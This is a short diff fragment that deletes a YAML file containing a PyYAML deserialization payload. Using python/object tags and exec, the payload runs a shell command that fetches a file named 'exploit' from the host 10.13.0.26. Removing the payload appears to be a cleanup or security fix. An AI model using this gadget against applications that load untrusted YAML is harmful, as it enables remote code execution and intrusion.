@@ -1,8 +1,0 @@
-- !!python/object/new:str
-  args: []
-  state: !!python/tuple
-    - "import os; os.system('wget http://10.13.0.26:8000/exploit')"
-    - !!python/object/new:staticmethod
-      args: [0]
-      state:
-        update: !!python/name:exec
